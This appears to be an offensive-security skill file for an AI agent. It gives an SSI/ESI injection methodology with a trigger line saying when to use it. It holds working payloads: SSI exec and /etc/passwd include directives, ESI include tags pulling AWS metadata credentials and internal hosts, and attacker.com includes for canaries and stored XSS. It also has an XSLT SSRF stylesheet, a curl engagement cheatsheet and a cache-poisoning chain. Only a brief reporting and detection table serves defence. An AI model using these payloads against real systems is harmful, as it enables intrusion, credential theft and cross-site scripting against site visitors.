---
name: offensive-ssi-esi
description: "Server-Side Includes (SSI) and Edge-Side Includes (ESI) injection methodology — SSI directive injection in cached pages, ESI tag injection across CDN-origin boundary (Akamai, Fastly, Varnish, Cloudflare), ESI-to-SSRF, ESI-to-XSS via include source, X-Forwarded-For-style header reflection into ESI, and chained cache poisoning + ESI for stored exploitation. Use when targets are behind a CDN that processes ESI tags or run Apache/IIS with mod_include enabled."
---

# SSI / ESI Injection

Server-Side Includes (SSI) and Edge-Side Includes (ESI) are template languages processed by web servers / CDNs respectively. Injection lets an attacker include arbitrary content, run shell commands (SSI), or fetch internal resources (ESI / SSRF).

## Quick Workflow

1. Identify whether the target / its CDN processes SSI or ESI
2. Find a reflection point (any user input echoed in a response)
3. Inject SSI/ESI tags into that point
4. Confirm execution / inclusion
5. Chain with cache poisoning for stored exploit

---

## SSI

Apache `mod_include`, IIS Server-Side Includes. Configured per-file-extension (typically `.shtml`, `.shtm`, `.stm`).

### Common Directives

```html
<!--#exec cmd="id"-->                            <!-- runs shell command -->
<!--#exec cgi="/cgi-bin/cmd.cgi"-->              <!-- runs CGI -->
<!--#include virtual="/etc/passwd"-->            <!-- includes file -->
<!--#config errmsg="Error"-->
<!--#echo var="DOCUMENT_NAME"-->
```

### Detection

```http
GET /search?q=<!--%23echo%20var=%22DATE_LOCAL%22-->
→ Response contains current date instead of the literal directive
```

If the response has `<!--#echo` interpreted, SSI is enabled.

### Exploitation

```http
GET /search?q=<!--%23exec%20cmd="id"-->
→ Response contains 'uid=33(www-data) ...'
```

Direct RCE.

```http
GET /search?q=<!--%23include%20virtual="/etc/passwd"-->
→ Response includes /etc/passwd
```

File read.

### Conditions

SSI requires:
- Server is configured to process the file extension as SSI (`.shtml` typical)
- `Options +Includes` or `Options +IncludesNOEXEC` (latter blocks `exec`)
- The reflected user input ends up in a file processed by mod_include

Many modern apps don't use SSI at all. When they do, it's often legacy.

## ESI

ESI is processed by **CDNs / reverse proxies** before serving to the client. Common implementations:

- Akamai (origin)
- Fastly Varnish (with vmod_esi)
- Cloudflare (limited ESI, varies by tier)
- Generic Varnish with ESI enabled

### Common ESI Tags

```html
<esi:include src="http://internal-svc/admin"/>
<esi:include src="http://169.254.169.254/latest/meta-data/iam/security-credentials/"/>
<esi:vars>$(HTTP_HOST)</esi:vars>
<esi:choose>...</esi:choose>
```

### Detection

```http
GET /page?content=<esi:include src="http://attacker.com/canary"/>
```

Check attacker.com logs for the canary fetch. If origin renders the literal tag and CDN processes it, the CDN does the fetch.

### Exploitation Paths

#### SSRF

```html
<esi:include src="http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name"/>
```

CDN fetches AWS IMDS → cloud credentials in response (sometimes; depends on whether ESI inserts the response into output).

#### Internal Network Pivot

```html
<esi:include src="http://internal-admin-panel.local/admin"/>
```

CDN sees internal-admin-panel.local from its egress vantage point.

#### XSS via Included Source

```html
<esi:include src="https://attacker.com/payload.html"/>
```

attacker.com responds with `<script>...</script>`; CDN inserts into the response → stored XSS for all viewers (cached).

### Conditions

For ESI to be exploitable:
- Origin returns ESI tags as part of the response body (often via reflected user input)
- CDN is configured to process ESI
- CDN's egress can reach interesting internal/cloud targets

### Cache Poisoning Chain

```
Attacker request: ?content=<esi:include src="..."/> with crafted Host
CDN keys cache by URL
Origin reflects the tag into response
CDN processes ESI, inserts content
CDN stores poisoned response under URL key
Future visitors get the poisoned response
```

This is the "stored ESI" pattern — see `offensive-cache-poisoning-deception`.

## XSLT (Adjacent)

Some CDNs / servers process XSLT for XML responses. XSLT injection can yield SSRF, file read, RCE depending on processor.

```xml
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0">
  <xsl:template match="/">
    <xsl:value-of select="document('http://internal-svc/')"/>
  </xsl:template>
</xsl:stylesheet>
```

If the target accepts XSLT input, server-side fetches happen.

## Identifying CDN Behavior

```bash
# Look for indicators
curl -sI https://target.com | grep -iE "(via|x-cache|x-akamai|x-fastly)"

# Test with specific ESI directive
curl 'https://target.com/?test=<esi:vars>$(HTTP_HOST)</esi:vars>'
```

If `<esi:vars>` resolves to the actual host, CDN processes ESI. If echoed literally, no ESI processing.

## Engagement Cheatsheet

```bash
# 1. SSI check
curl 'https://target.com/page?q=<!--%23echo+var="DATE_LOCAL"-->'

# 2. ESI check
curl 'https://target.com/page?q=<esi:vars>$(HTTP_HOST)</esi:vars>'

# 3. ESI canary
curl 'https://target.com/page?q=<esi:include+src="http://attacker.com/canary"/>'
# Watch attacker logs

# 4. ESI to internal
curl 'https://target.com/page?q=<esi:include+src="http://internal-svc/"/>'

# 5. SSI to RCE (rarer)
curl 'https://target.com/x.shtml?q=<!--%23exec+cmd="id"-->'

# 6. Cache-stored ESI exploit (chain with cache poisoning)
```

## Reporting

- Server / CDN identified
- Specific reflection point (URL parameter, header, body)
- Injected directive and observed effect
- Internal resources reachable (if SSRF)
- Persistence via cache poisoning (if exploitable)

## Detection

| Signal | Defender View |
|---|---|
| ESI tag in response output | Origin observability if the tag is logged before CDN processing |
| Unusual outbound from CDN egress | Network telemetry |
| 4xx/5xx spikes for ESI-malformed requests | Application logs |

CDN-side detection of ESI exploitation is rare unless customer instrumented it.

---

## Key References

- "Beyond XSS: Edge Side Include Injection" (Louis Dion-Marcil, 2018)
- W3C ESI Language Specification
- Apache mod_include documentation
- Source: https://github.com/SnailSploit/offensive-checklist/blob/main/ssi-esi.md
